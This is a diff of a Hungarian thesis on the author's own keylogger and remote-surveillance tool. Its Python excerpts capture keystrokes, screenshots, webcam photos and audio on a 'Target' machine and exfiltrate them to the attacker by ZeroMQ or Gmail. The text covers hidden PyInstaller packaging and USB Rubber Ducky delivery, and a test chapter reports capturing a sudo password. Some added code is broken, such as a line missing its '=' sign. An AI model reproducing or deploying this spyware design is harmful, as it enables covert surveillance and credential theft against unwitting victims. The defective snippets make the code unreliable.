@@ -132,6 +132,10 @@ A keyloggereknek van jó, illetve rossz oldaluk is. Rosszhírük a filmvilágnak
 
 Az első keylogger hardver alapú volt, amit a Szovjet Únió fejlesztett ki a 1970-es évek közepén írógépeket célozva. Megmérte az IBM Selectric írógépek nyomtatófejének mozgását a regionális mágneses mezőre gyakorolt finom hatásokon keresztül, amelyeket a nyomtatófej forgása és mozgásai okoztak. Egy korai keyloggert Perry Kivolowitz írt, és 1983 november 17-én tette közzé az Usenet net.unix-wizards, net.sources. A felhasználói módú program a karakterlisták (kliensek) felkutatásával és kiírásával működött, ahogyan a Unix kernelbe beállították. Az 1970-es években a kémek keyloggereket telepítettek az amerikai nagykövetség és a moszkvai konzulátus épületébe, kihasználva a Selectric II és a Selectric III elektomos írógépek hibáit. A szovjet nagykövetségek elektromos írógépek helyett kézi írógépeket használtak bizalmas információkhoz, nyilván azért, mert nem sebezhetőek az ilyen támadásokkal szemben. 2013-tól az orosz különleges szolgálatok még mindig írógépeket használnak.
 
+Kevin Mitnick, a világ legkeresettebb binztonsági szakértője a következőt állítja a social engineering-ről \cite{ghostwires}: Amikor social engineering-et használsz, egy szerepet kell eljátszanod. Mielőtt elkezdenéd a social engineering-et, információt kell gyűjts a célpontról, hogy elérd a kitűzött célod. (``When you use social engineering, or "pretexting", you become an actor playing a role. Before you start social engineering for some particular goal, you do your reconnaissance.'')
+
+A social engineering tehnikák egyszerűen azért működnek, mert az emberek bíznak azokban, akik hitelesek, például egy vállalat alkalmazottja. A trükk az, hogy ha érzékeny információt kérsz, akkor az emberek azonnal gyanakodni kezdenek. De ha úgy teszel, mintha már rendelkeznél az információval, és valami rosszat adsz nekik, akkor gyakran kijavítanak. (``The social engineering techniques work simply because people are very trusting of anyone who establishes credibility, such as an authorized employee of the company. The trick is if you ask for a piece af sensitive information, people naurally grow immediately suspicious. If you pretend you already have the information and give them something that is wrong, they'll frequently correct you.'')
+
 Az ellenintézkedések hatékonysága változó, mivel a keyloggerek különböző technikákat alkalmaznak az adatok rögzítésére. Így az ellenintészkedéseknek hatékonynak kell lenniük az adott adatrögzítési technikával szemben is. A grafikus felhasználói felülettel rendelkező operációs rendszereken használható a képernyőn megjelenő billentyűzet. Ez hatékony a hardveres keyloggerek ellen, ugyanis egyértelmű módon nem kerül sor a hagymányos billentyűzet használatára.
 
 A következő fejezetben részletes bemutatásra kerülnek a keyloggerek tipusai és az ellenintézkedések formái.
@@ -214,8 +218,6 @@ A Windows rendszereken egy horog folyamat a $SetWindowsHookEx$ függvényt haszn
 
 
 \chapter{A rendszer specifikációi és architektúrája}\label{sec:specs_and_arch}
-%virtualis gepek -> meresek, hany klienst bir el
-%kiserletek, grafikonok
 
 \section{Felhasználói követelmények}
 %user needs
@@ -316,7 +318,7 @@ A webkamerakép előállításához az áldozatnak kell legyen webkamerája csat
 
 A hangfelvétel készítéséhez az áldozatnak szüksége van egy működőképes mikrofonra. A hangfelvétel minősége 44100Hz. A felvétel időtartamát, másodpercbe mérve, meg lehet változtatni tetszés szerint, de ezt az áldozathoz való juttatás előtt kell megtenni. Alapértelmezetten tíz másodperces felvétel készül.
 
-Az adatok begyűjtésére szükséges az internet. A hálózatot használó kommunikáció a későbbiekben részletezve lesz.
+Az adatok begyűjtésére szükséges az Internet. A hálózatot használó kommunikáció a későbbiekben részletezve lesz.
 
 \subsection{Nem funkcionális követelmények}
 A szoftvert Windows, Linux és Darwin rendszerekre tervezzük. A rendszeren szükséges telepíteni a python 3.x verzióját, mivel olyan modulok és szintakszisok vannak használatban, amelyeket a python 2.x nem ismer. Például a formázott karakterláncot rövidebben lehet kivitelezni úgy, hogy a karakterlánc elejére egy f betű kerül és kapcsos zárójelekbe kerülnek a változónevek. A python 2.x verziójával ezt külön fuggvénnyel lehetett megvalósítani.
@@ -332,6 +334,7 @@ Ez egy olyan szoftver, amelyet törvényes és törvénytelen dolgokra is lehet 
 \item urllib
 \item zmq = 21.0.1
 \item base64
+\item pickle
 \item opencv
 \item getpass
 \item os
@@ -345,7 +348,7 @@ Ez egy olyan szoftver, amelyet törvényes és törvénytelen dolgokra is lehet 
 \item platform
 \item tkinter
 \item logging
-\item pyinstaller
+\item pyinstaller = 4.1
 \item http.server
 \end{itemize}
 \end{multicols}
@@ -361,6 +364,8 @@ A \emph{urllib} modul segítségével kéréseket küldhetünk a hálózaton.
 
 A \emph{base64} modul használatával szövegtitkosítást lehet végezni, mivel a base64 szövegtitkosító agoritmust tartalmazza.
 
+A \emph{pickle} modul bájtokká tömöríti az adatot így gyorsabb lesz az elküldése a hálozaton.
+
 Az \emph{opencv} modul képek vagy videók feldolgozásában használható, például webkamerakép készítésére.
 
 A \emph{getpass}, \emph{os}, \emph{sys}, \emph{shutil} és \emph{platform} modulok a rendszerfüggvények elérését biztosítja. A rendszerinformációit függvények használata, mint például a processzor specifikációi, a bejelentkezett felhasználo felhasználóneve, a számítógép neve, a rendszer verziószáma stb.
@@ -375,17 +380,13 @@ A \emph{tkinter} modul a GUI elkészítésére használandó, ez felel a megjele
 
 A \emph{logging} modul segítségével visszajelzéseket adunk a szoftvertől a felhasználónak, hogy lehessen követni az aktuális feladat menetét. Ehez szükséges egy $logging.conf$ állomány, maely béállítja a loggolási opciókat.
 
-A \emph{pyinstaller} modul egy fordító program, amely python kódból futtatható fájlt készít. Lefordításra csak a kliens kerül, mert azt kell az áldozat rendszerére telepíteni, úgy, hogy a háttérben fusson. Ezt be lehet állítani a $w$ opcióval Windows rendszereken, míg *NIX rendszereken nem veszi számításba ezt az opciót. A $onefile$ opció összesűríti egy futtathatóvá, ez által lehetővé teszi, hogy ne kelljen más szükséges állományokat is telepíteni az áldozat rendszerére. Be lehet állítani a futtatható fájl nevét ($name$ opció) és ikonját is ($icon$ opció).
+A \emph{pyinstaller} modul egy fordító program, amely python kódból futtatható fájlt készít. Lefordításra csak a kliens kerül, mert azt kell az áldozat rendszerére telepíteni, úgy, hogy a háttérben fusson. Ezt be lehet állítani a $w$ opcióval Windows rendszereken, míg *NIX rendszereken nem veszi számításba ezt az opciót. A $onefile$ opció összesűríti egy futtathatóvá, ez által lehetővé teszi, hogy ne kelljen más szükséges állományokat is telepíteni az áldozat rendszerére. Be lehet állítani a futtatható fájl nevét ($name$ opció) és ikonját is ($icon$ opció). A modul 4.1 verzióját vagy ennél nagyobbat érdemes használni, mert a 4.1 verziótól támogatja a python 3.8 és 3.9 verziókat.
 
 %Teljesítmény...
 
 %Karbantarthatóság...
 
 \chapter{A részletes tervezés}\label{sec:plan}
-%dobozok | arhitektura | blokk diagram
-%kommunikacios module
-%beszelni a digram dobozairol
-
 A szoftvert két nagy részre lehet osztani: Hacker oldal és Target oldal. A Hacker oldalhoz tartozik a GUI is. A két komponens mellett megtalálható egy kissebb rész (Utils), amely hasznos függvények implementációit tartalmazza úgy a Hacker, mint a Target oldalnak.
 \begin{figure}[H]
 \centering
@@ -395,9 +396,9 @@ A szoftvert két nagy részre lehet osztani: Hacker oldal és Target oldal. A Ha
 \end{figure}
 
 \section{Hacker oldal}\label{subsec:server}
-Előszőr, hogy működjön a gyakori operációs rendszereken meg kell nézni, hogy melyiken futtatjuk. Ezt a platform modul system függvény segítségével tudjuk megnézni:
+Előszőr, hogy működjön a gyakori operációs rendszereken meg kell nézni, hogy melyiken futtatjuk. Ezt a platform modul system függvény segítségével tudjuk megnézni, amely a $get\_system\_name\_and\_path$ függvényben van implementálva. Beolvasásra kerül az általunk megírt loggolási konfigurációs fájl (logging.conf) és egyes adatok tárolásához alkalmas konfigurációs fájl (config.ini). A $logging.conf$ tartalmazza a loggolási szintet (DEBUG), a loggolás nevét, hogy beolvasáskor tudjunk hivatkozni rá (itt meg lehet adni több loggolási mintát) és a kiírt üzenet formátumát. A $config.ini$ tartalmazza azokat az értékeket amelyeket hard kódolni kellene, mint például a portok, ip címek, jelszavak, felhasználók, stb.
 
-\lstinputlisting[language=Python, firstline=13, lastline=21]{../src/TCP_Server.py}
+\lstinputlisting[language=Python, firstline=13, lastline=23]{../src/HackerApp.py}
 
 Ha nem a három operációs rendszer közé tartozik, akkor kilép a program. Itt a rendszer neve meghatározza a $temp\_path$ változót. Ez a változó tartalmazza a temporális könyvtárat az operációs rendszeren, hogy a lenyomott billentyűket eltudja menteni a Target számítógépén. A temporális mappa Linux és Darwin (MacOS) rendszereken megegyező, míg Windows rendszeren különbözik.
 
@@ -426,14 +427,29 @@ A REQ | REP egy kétoldali kommunikáció, mert a Hacker oldal küld kéréseket
 
 A háttérben a ZeroMQ protokoll TCP kapcsolatot hoz létre, de nem kell foglalkozni a csomagkezeléssel.
 
+A publisher feladata az üzenetek küldése témákon belül. Az üzeneteket csak azok kapják meg, akik feliratkoztak a bizonyos témára, lásd ábra \ref{fig:pubsub}
+\begin{figure}[H]
+\centering
+\includegraphics{../images/pubsubrel}
+\caption{Publisher subscriber kapcsolat}
+\label{fig:pubsub}
+\end{figure}
+A mi esetünkben a publisher szerepét a Target játsza és a subscriber a Hacker. Meg lehet oldani a több Target és egy Hacker kapcsolatát, ezért olyan ábrát kellene elképzelni, amelyen több publisher és egy subscriber van. Az ábra \ref{fig:pubsub2} szemlélteti az általunk használt folyamatot:
+\begin{figure}[H]
+\centering
+\includegraphics{../images/pubsubrel2}
+\caption{Az általunk használt publisher subscriber kapcsolat}
+\label{fig:pubsub2}
+\end{figure}
+
 \subsection{KeyloggerHacker osztály}\label{subsubsec:keyloggerclass}
-A KeyloggerHacker osztályt a $Thread$ osztályból van származtatva, mert egy külön szálon kell fusson a GUI miatt. A GUI csak a fő szálon van engedélyezve, mert a tkinter modul nem engedi, hogy a létrehozott objektumok mellékszálakon fussanak. Ennek az osztálynak öt attribútumja van: a létrejött kapcsolat a Hacker oldal és a Target oldal között, a GUI, gmail cím, a hozzá tartozó jelszó és a gmail szolgáltató ip címe. A gmail rendelkezik egy szolgáltatóval, amely lehetővé teszi a kódból való levél küldését és fogadását (a fogadás külön szolgáltatót használ). A $connection$ és a $gui$ paraméterek egy-egy osztályt várnak, ezért kapcsolatot és a GUI-t ellenőrizni kell, hogy jó osztály került-e átadásra.
+A KeyloggerHacker osztályt a $Thread$ osztályból van származtatva, mert egy külön szálon kell fusson a GUI miatt. A GUI csak a fő szálon van engedélyezve, mert a tkinter modul nem engedi, hogy a létrehozott objektumok mellékszálakon fussanak. Ennek az osztálynak kilenc attribútumja van: a létrejött kapcsolat a Hacker oldal és a Target oldal között, a GUI, gmail cím, a hozzá tartozó jelszó, a gmail szolgáltató címe, a rendszer temporális könyvtára, a menü, a logger, amely a loggolást segíti és a konfigurációt tartalmazó adatstruktúra. A gmail rendelkezik egy szolgáltatóval, amely lehetővé teszi a kódból való levél küldését és fogadását (a fogadás külön szolgáltatót használ). A $connection$, a $gui$ és a menü paraméterek egy-egy osztályt várnak.
 
-A $KeyloggerHacker$, a fő osztály, amelyre épül a szoftver. Mivel külön szálon fut, ezért felül kell írni a $run$ függvényt, amelyben implementálva van a billentyűzet gombjai lenyomásának a kezelése és az e-mail fogadása. Amíg a kapcsolat él a Communication modulban, addig azon keresztül küldi a lenyomott karaktereket, amit elment a log.csv állományba a Hacker oldalon, hogy a későbbiekben újra megtekinthető legyen. A log.csv állomány formátuma lenyomott billentyű ideje, karakter. Ahol az idő ``nap/hónap/év $|$ óra:perc:másodperc'' formátumu.
+A $KeyloggerHacker$, a fő osztály, amelyre épül a szoftver. Mivel külön szálon fut, ezért felül kell írni a $run$ függvényt, amelyben implementálva van a billentyűzet gombjai lenyomásának a kezelése és az e-mail fogadása. Amíg a kapcsolat él a CommunicationHacker modulban, addig azon keresztül küldi a lenyomott karaktereket, amit elment a log.csv állományba a Hacker oldalon, hogy a későbbiekben újra megtekinthető legyen. A log.csv állomány formátuma lenyomott billentyű ideje, karakter. Ahol az idő ``nap/hónap/év $|$ óra:perc:másodperc'' formátumban van megadva.
 
-A kapcsolat megszakadhat, ha például a tűzfal (firewall) megtíltja a használt porton való kommunikációt, igy egy biztonságosabb kommunikációt kell használni, esetünkben ez az e-mail használatát jelenti.
+A kapcsolat megszakadhat, ha például a tűzfal (firewall) megtíltja a használt porton való kommunikációt, így egy elérhető kommunikációt kell használni, esetünkben ez az e-mail használatát jelenti.
 
-A Hacker oldalon és a Target oldalon egy modul kommunikál egymással. A Hacker oldalon létrehozza az egyoldalu kommunikációt, és vár a Target válaszára. A kommunikáció kell tartalmazza a Hacker oldali ip címet és a két portot, amiket a Target oldalon kell megadni. A Hacker oldalon csak a megnyitott portok a lényegesek, amelyeken kommunikál az applikáció. Erre terveztünk egy saját kis csomagot, lásd táblázat \ref{tab:protocol}:
+A Hacker és a Target oldalon egy modul kommunikál egymással. A Hacker oldalon létrehozza az egyoldalu kommunikációt, és vár a Target válaszára. A kommunikáció kell tartalmazza a Hacker oldali ip címet és a két portot, amiket a Target oldalon kell megadni. A Hacker oldalon csak a megnyitott portok a lényegesek, amelyeken kommunikál az applikáció. Erre terveztünk egy saját kis csomagot, lásd táblázat \ref{tab:protocol}:
 \begin{table}[H]
 \centering
 \caption{Csomag}
@@ -460,7 +476,7 @@ A továbbiakban az adatok feldolgozásra kerülnek, ha a kapcsolat még nem zár
 \begin{lstlisting}[language=Python]
 if data[0] == "chars":
 	write_file(os.path.join(path, filename), data[1:])
-	if gui_running:
+	if self.gui.gui_running:
 		self.gui.insert_data(data[1:])
 	elif data[0] == 'close':
 		self.connection.socket_stream.close()
@@ -506,7 +522,7 @@ def get_attachments(self, msg):
 \end{lstlisting}
 
 \subsection{MenuHandlerHacker osztály}\label{subsubsec:menuhandler}
-A $MenuHandler$ osztály segítségével más feladatot is adhatunk a Target oldalnak a billentyűzet naplózása mellett. Ez az osztály is a $Thread$ osztályból származik, mert egy külön szál kell amiatt, hogy ne blokkolódjon az adatfeldolgozás, mivel I/O műveleteket végez. Az I/O  Ennek az osztálynak egy attribútumja van: a kapcsolat. Ez a kapcsolat fogja megvalósítani az opciók küldését a kliensnek. Itt négy opció lehet:
+A $MenuHandlerHacker$ osztály segítségével más feladatot is adhatunk a Target oldalnak a billentyűzet naplózása mellett. Ez az osztály is a $Thread$ osztályból származik, mert egy külön szál kell amiatt, hogy ne blokkolódjon az adatfeldolgozás, mivel I/O műveleteket végez.  Ennek az osztálynak három attribútumja van: a kapcsolat, a loggolást tartalmazó konfiguráció és egy logikai változó, amely megmondja, hogy a fut vagy nem fut a szál. A kapcsolat fogja megvalósítani az opciók küldését a kliensnek. Itt négy opció lehet:
 \begin{itemize}
 \item 1) Take screenshot - képernyőkép
 \item 2) Webcam picture - webkamerakép
@@ -521,31 +537,31 @@ Itt kezelve van a kérésre visszaküldött adat:
 \begin{lstlisting}[language=Python]
 if data[0] == "image":
 	if data[2] == 'Error':
-		logger.info("Error while taking screenshot!")
+		self.logger.info("Error while taking screenshot!")
 	else:
 		with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
 			handler.write(data[2])
-			logger.info('Done')
+			self.logger.info('Done')
 elif data[0] == "wcpic":
 	if data[2] == 'Error':
-		logger.info("Error while taking webcam picture!")
+		self.logger.info("Error while taking webcam picture!")
 	else:
 		with open(f'./webcam_{data[1]}.png', 'wb') as handler:
 			handler.write(data[2])
-			logger.info('Done')
+			self.logger.info('Done')
 elif data[0] == 'audio':
 	if data[2] == 'Error':
-		logger.info("Error while recording audio!")
+		self.logger.info("Error while recording audio!")
 	else:
 		with open(f'./audio_{data[1]}.wav', 'wb') as handler:
 			handler.write(data[2])
-			logger.info('Done')
+			self.logger.info('Done')
 \end{lstlisting}
 
 \section{Target oldal}\label{subsec:client}
 A Target oldal is három osztályt tartalmaz, mint a Hacker oldal, ha nem vesszük számításba a GUI-t, mert a GUI egy különálló alkalmazás, csak a Hacker oldal fogja aktíválni, lásd ábra \ref{fig:clientclassdia}.
 
-Előszőr, meg kell nézni, hogy milyen rendszeren van futtatva. Ez után létre van hozva a ``Communication'' osztály, amelynek négy attribútumja van: egy ip cím, két port (egy a PUB SUB kapcsolatnak és egy a REQ REP kapcsolatnak) és a ZeroMQ által létrehozott kontextus. Példányosításkor az ip címnek egy helytartót (*) kell megadni, vagy a lokális ip címet.
+Előszőr, meg kell nézni, hogy milyen rendszeren van futtatva. Ez után létre van hozva a $CommunicationTarget$ osztály, amelynek négy attribútumja van: egy ip cím, két port (egy a PUB SUB kapcsolatnak és egy a REQ REP kapcsolatnak) és a ZeroMQ által létrehozott kontextus. Példányosításkor a Hacker publikus ip címét kell megadni.
 \begin{figure}[H]
 \centering
 \includegraphics[width=400pt]{../images/targetclassdiagram}
@@ -557,9 +573,9 @@ Előszőr, meg kell nézni, hogy milyen rendszeren van futtatva. Ez után létre
 A kapcsolat létesítésében a $connect2stream$ és a $connect2interact$ függvények játszanak szerepet. A connect2stream megvalósítja a PUB SUB kapcsolatot, míg a connect2interact a REQ REP kapcsolatot. A $CommunicationTarget$ osztály segítségével fog a Target kapcsolódni a Hackerhez. Az $urllib.request$ modul $openurl$ függvényét alkalmazva megnyitunk a publikus ip cím lekérő api-t (https://api.ipify.org) és kérést küldünk, amellyel megkapjuk a Target publikus ip címét.
 
 \subsection{KeyLoggerTarget osztály}\label{subsubsec:keyloggerclientclass}
-Ez az osztály valósítja meg a lenyomott billentyűk kezelését. Hat attribútumot tartalmazó osztály: a kapcsolat, gmail cím, gmail jelszó, gmail szolgáltató, gmail port és a lenyomott billentyűt tartalmazó változó.
+Ez az osztály valósítja meg a lenyomott billentyűk kezelését. Kilenc attribútumot tartalmazó osztály: a kapcsolat, gmail cím, gmail jelszó, gmail szolgáltató, gmail port, a lenyomott billentyűt tartalmazó változó, a rendszer temporális könyvtára és a rendszer neve.
 
-Az első adat nem követi a megállapított protokolt. Ez az adat tartalmazza a Target rendszerének információit:
+Az első adat nem követi a megállapított csomag felépítését. Ez az adat tartalmazza a Target rendszerének információit:
 \begin{itemize}
 \item system name
 \item device name
@@ -603,7 +619,7 @@ def get_time():
 \end{lstlisting}
 A $keys$ változóba karakterként vagy karakterláncként kerül a lenyomott billentyű, ezért le kell cseélni a szélső idézőjeleket üres karakterekre. Karakter helyett akkor kerül karakterlánc, ha olyan karaktereket nyomunk le, amelyek nem nyomtathatóak, például: $ENTER$, $SPACE$, stb. Ilyenkor $Key.enter$ vagy $Key.space$ stb formátumban kapjuk meg.
 
-A hálózaton közlekedő adatokat meg lehet nézni a wireshark szoftverrel, amelyet csomagok analizálására használnak. Észre lehet venni, hogy az adatok emberileg olvashatóak (ábra \ref{fig:packetcapture}), ezért a python base64 modulját alkalmazva kódoljuk a küldendő adatokat.
+A hálózaton közlekedő adatokat meg lehet nézni a wireshark szoftverrel, amelyet csomagok analizálására használnak. Észre lehet venni, hogy az adatok emberileg olvashatóak (ábra \ref{fig:packetcapture}), ezért a python base64 modulját alkalmazva kódoljuk a küldendő adatokat. A kódolás után a $pickle$ modul segítségével bájtokká tömörítjük az adatokat.
 \begin{figure}[H]
 \centering
 \includegraphics[width=400pt]{../images/wiresharkcapture}
@@ -622,16 +638,16 @@ msg.attach(MIMEText(body, 'plain'))
 file_attachment = MIMEBase('application', 'octet-stream')
 
 with open(os.path.join(temp_path, filename), 'rb') as handler:
-file_attachment.set_payload(handler.read())
+	file_attachment.set_payload(handler.read())
 
 encoders.encode_base64(file_attachment)
 file_attachment.add_header('Content-Disposition', "attachment; filename=" + filename)
 msg.attach(file_attachment)
 
-if take_screenshot(temp_path):
+if take_screenshot(self.temp_path):
 	image_attachment = MIMEBase('application', 'octet-stream')
 
-	with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
+	with open(os.path.join(self.temp_path, "screenshot.png"), 'rb') as handler:
 		image_attachment.set_payload(handler.read())
 
 	encoders.encode_base64(image_attachment)
@@ -667,55 +683,59 @@ date_time = datetime.now().strftime("%d_%H_%M_%S")
 if option == '1':
 	data = ["image", date_time]
 
-	if take_screenshot(temp_path):
-		if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
-			with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
+	if take_screenshot(self.temp_path):
+		if os.path.isfile(os.path.join(self.temp_path, "screenshot.png")):
+			with open(os.path.join(self.temp_path, "screenshot.png"), 'rb') as handler:
 				data.append(handler.read())
 		else:
 			data.append("Error")
 	else:
 		data.append("Error")
 	try:
-		data = base64.b64encode(str(data).encode()).decode()
-		self.connection.socket_interact.send_string(data)
-	except:
+		data =b64encode(str(data).encode())
+		data = pickle.dumps(data)
+		self.connection.socket_interact.send(data)
+	except Exception:
 		break
 elif option == '2':
 	data = ["wcpic", date_time]
 
-	if take_webcam_picture(temp_path):
-		if os.path.isfile(os.path.join(temp_path, "wc_picture.png")):
-			with open(os.path.join(temp_path, "wc_picture.png"), 'rb') as handler:
+	if take_webcam_picture(self.temp_path):
+		if os.path.isfile(os.path.join(self.temp_path, "wc_picture.png")):
+			with open(os.path.join(self.temp_path, "wc_picture.png"), 'rb') as handler:
 				data.append(handler.read())
 		else:
 			data.append("Error")
 	else:
 		data.append("Error")
 	try:
-		data = base64.b64encode(str(data).encode()).decode()
-		self.connection.socket_interact.send_string(data)
-	except:
+		data = b64encode(str(data).encode())
+		data = pickle.dumps(data)
+		self.connection.socket_interact.send(data)
+	except Exception:
 		break
 elif option == '3':
 	data = ["audio", date_time]
 
-	if record_audio(temp_path):
-		if os.path.isfile(os.path.join(temp_path, "rec_audio.wav")):
-			with open(os.path.join(temp_path, "rec_audio.wav"), 'rb') as handler:
+	if record_audio(self.temp_path):
+		if os.path.isfile(os.path.join(self.temp_path, "rec_audio.wav")):
+			with open(os.path.join(self.temp_path, "rec_audio.wav"), 'rb') as handler:
 				data.append(handler.read())
 		else:
 			data.append("Error")
 	else:
 		data.append("Error")
 	try:
-		data = base64.b64encode(str(data).encode()).decode()
-		self.connection.socket_interact.send_string(data)
-	except:
+		data = b64encode(str(data).encode())
+		data = pickle.dumps(data)
+		self.connection.socket_interact.send(data)
+	except Exception:
 		break
-elif option == '4' or stop_threads:
+elif option == '4':
 	data = ["close", date_time, "Exit"]
-	data =base64.b64encode(str(data).encode()).decode()
-	self.connection.socket_stream.send_string(data)
+	data b64encode(str(data).encode())
+	data = pickle.dumps(data)
+	self.connection.socket_stream.send(data)
 	self.connection.socket_stream.close()
 	self.connection.socket_interact.close()
 	break
@@ -726,7 +746,7 @@ A $take\_screenshot$ függvény fogja megcsinálni a képernyőképet, amely iga
 def take_screenshot(save_path):
 	try:
 		pyautogui.screenshot(os.path.join(save_path, "screenshot.png"))
-	except:
+	except Exception:
 		return False
 	return True
 
@@ -767,15 +787,85 @@ def record_audio(save_path):
 		wf.setframerate(fs)
 		wf.writeframes(b''.join(frames))
 		wf.close()
-	except:
+	except Exception:
 		return False
 	return True
 \end{lstlisting}
-A hangrögzítés egy kicsivel másképp kezelendő, mert meg kell mondani, hogy egy részt hány bájton abrázoljon (1024), milyen formátumba ábrázolja (16 bit int), hány csatornán (2) ábrázolja a hanghullámokat, mekkora frekvencián (44.1 kHz) és hány másodperces felvételt akarunk elmenteni (10). Ezek a függvények egy úgynevezett $utils.py$ mellékállományban vannak implementálva, ami említésre kerül a komponensek bemotatásánál.
+A hangrögzítés egy kicsivel másképp kezelendő, mert meg kell mondani, hogy egy részt hány bájton abrázoljon (1024), milyen formátumba ábrázolja (16 bit int), hány csatornán (2) ábrázolja a hanghullámokat, mekkora frekvencián (44.1 kHz) és hány másodperces felvételt akarunk elmenteni (10). Ezek a függvények egy úgynevezett $utils.py$ mellékállományban vannak implementálva, amely említésre kerül a komponensek bemutatásánál.
 
-\chapter{A rendszer felhasználása}\label{sec:useage}
+%\chapter{A rendszer felhasználása}\label{sec:useage}
 
-\chapter{Üzembe helyezés és kísérleti eredmények}\label{sec:testcases}
+\chapter{Kísérleti eredmények}\label{sec:testcases}
+% le kell irni a mero berendezest
+% kiserlet nr 1 VMs
+% kiserlet nr 2 valos gepek
+%--------------------
+% stress testing | mennyit tud athozni
+
+A szoftver teszteléséhez létrehoztunk egy-egy viruális gépet a gyakori operációs rendszerekről, és valós gépeken is teszteltük. A virtuális gépek létrehozásához a VMware Workstation szoftvert használtuk.
+
+\section{Viruális gépeken való kísérlet}
+Három virtuális gépet kellett létrehozni, és telepíteni a Windows, Linux és Mac operációs rendszereket. Ezeken a gépeken telepítve volt a python 3.X és a szükséges csomagok a tesztelés kivitelezéséhez. A rendszer elindítása után csatlakoztatjuk a USB Rubber Ducky-t, amely letölti a futtatható (EXE vagy ELF) fájlt a rendszerre.
+
+Az EXE a Windows rendszerekre jellemző futtatható fájlok. Az ELF pedig a UNIX rendszerekre jellemző, mivel az EXE egy fájl kiterjesztése (például: keylogger.exe), UNIX redszereken a fájl kiterjesztése elhanyagolható (például: keylogger).
+
+A következő alfejezetek a különböző operációs rendszereken mért eredményeket mutatják be.
+
+\subsection{Windows rendszer (VM)}
+A rendszer specifikációi: 4 processzor (processzorok száma: 1, mag/processzor: 4), 4 GB memória, 60 GB merevlemez tárhely, 64 bites arhitektúra, Windows 10 Pro.
+
+Két felhasználót készítettünk, egy az alapértelmezett, amelyik adminisztrátor jogosultsággal rendelkezik (John), a másik egy hétköznapi felhasználó (Steve). Steve felhasználónak szüksége van John felhasználó jelszavára, ha olyan dolgokat akar végrehajtani, amelyekhez nincs jogosultsága.
+
+Steve felhasználót használva, ha be szeretnénk lépni John felhasználó mappájába, akkor felugrik egy ablak, amely kéri az admin jelszavát, lásd ábra \ref{fig:winVM1}. Ebben a helyzetben az  általunk fejlesztett keylogger nem képes elfogni a lenyomott billentyűket. Bármely más helyzetben sikeresen elfogja a lenyomott billyentyűket.
+\begin{figure}[H]
+\centering
+\includegraphics{../images/windowsVM1}
+\caption{Jogosultságkezelő ablak}
+\label{fig:winVM1}
+\end{figure}
+
+\subsection{Linux rendszer (VM)}
+A rendszer specifikációi: 16 processzor (processzorok száma: 4, mag/processzor: 4), 8 GB memória, 200 GB merevlemez tárhely, 64 bites arhitektúra, Kali Linux KDE.
+
+Létrehoztunk egy felhasználót (John) adminisztrátor jogosultsággal. Észrevettük, hogy a szoftver elfogja a jelszó mezőbe írt karaktereket is. A következő ábrák \ref{fig:linuxVM2} és \ref{fig:linuxVM1} szemléltetik ezt.
+\begin{figure}[H]
+\centering
+\includegraphics[width=450pt]{../images/linuxVM2}
+\caption{John felhasználó terminálja}
+\label{fig:linuxVM2}
+\end{figure}
+\begin{figure}[H]
+\centering
+\includegraphics[width=400pt]{../images/linuxVM1}
+\caption{Az elfogott karakterek}
+\label{fig:linuxVM1}
+\end{figure}
+
+A \textit{sudo -l} paracsot alkalmazva megnézhetjük, hogy milyen parancsokat futtathatunk \textit{sudo}, vagy adminisztrátor joggal. Ehhez szükséges megadni a felhasználó (John) jelszavát. Az ábra \ref{fig:linuxVM1} mutatja, hogy a pirossal bekeretezett részen John felhasználó jelszava található, amit az ábra \ref{fig:linuxVM2} jelszó mezőjébe beírtunk (jelszó mező: [sudo] password for john:).
+
+\subsection{Mac rendszer (VM)}
+A rendszer specifikációi: 2 processzor (processzorok száma: 1, mag/processzor: 2), 8 GB memória, 100 GB merevlemez tárhely, 64 bites arhitektúra, MacOS Catalina 10.15.5.
+
+Az operációs rendszer telepítésekor létrehoztunk egy felhasználót (John), akinek adminisztrátor jogosultsága van. A szoftver elindításakor (ha terminálból indítjuk el) felugrik egy ablak, amely kérvényezi a billentyűzet monitorizálásához az engedélyt, lásd ábra \ref{fig:macVM1}. Így csak akkor működik a szoftver miután a felhasználó engedélyezte, ha nincs alapból engedélyezve. Ez a helyzet fentáll akkor is, ha kameraképet szeretnénk készíteni, és esetekben a képernyőképnél is.
+\begin{figure}[H]
+\centering
+\includegraphics[width=400pt]{../images/macVM1}
+\caption{Engedélyező ablak MAC rendszeren}
+\label{fig:macVM1}
+\end{figure}
+
+Feltételezzük, hogy az engedély a billentyűzet monitorizálásához megvan, így el tudjuk fogni a leütött billentyűket. Ebben az esetben is, mint a Windows rendszer esetében, ha admininisztrátor jogosultság kell egy feladat elvégzéséhez, akkor azt a jelszót nem tudjuk elfogni. Az ábra \ref{fig:macVM2} szemlélteti, hogy a megadott jelszót nem tudjuk elfogni.
+\begin{figure}[H]
+\centering
+\includegraphics[width=400pt]{../images/macVM2}
+\caption{Terminálon végzett feladat John felhasználóval}
+\label{fig:macVM2}
+\end{figure}
+
+\section{Valós gépeken való kísérlet}
+Valós gépek alatt a saját laptopomat és asztali gépemet használtam tesztelésre, Windows és Linux operációs rendszereken. Mac operációs rendszer alatti tesztelésben egyik rokonom segített ki egy Apple laptoppal.
+
+A tesztek eredményei teljesen megeggyeztek a virtuális gépeken való tesztek eredményeivel. Ebben az esetben is a bejelentkezési jelszavak elfogására törekedtem. Windows és Mac rendszereken nem tudtam a jelszavakat begyűjteni, míg Linux rendszeren ez sikeres volt. A virtuális gépeken levő operációs rendszerek és a valós gépeken levő operációs rendszerek verziója között nem volt nagy eltérés. A kicsi eltérés alatt azt értem, hogy az operációs rendszerek megeggyeznek csak egyes helyeken frissített verzión teszteltem és máshol peding régebbi verzión.
 
 \chapter{Következtetések}\label{sec:conc}
 
@@ -783,16 +873,13 @@ A hangrögzítés egy kicsivel másképp kezelendő, mert meg kell mondani, hogy
 \renewcommand{\listfigurename}{Ábrák jegyzéke}
 \listoffigures
 \thispagestyle{empty}
-\cleardoublepage
 
 % table of tables
 \renewcommand{\listtablename}{Táblázatok jegyzéke}
 \listoftables
 \thispagestyle{empty}
-\cleardoublepage
 
-\chapter{Irodalomjegyzék}\label{sec:irod}
-\printbibliography[title={\ }]
+\printbibliography
 
 \chapter{Függelék}\label{sec:dep}
 
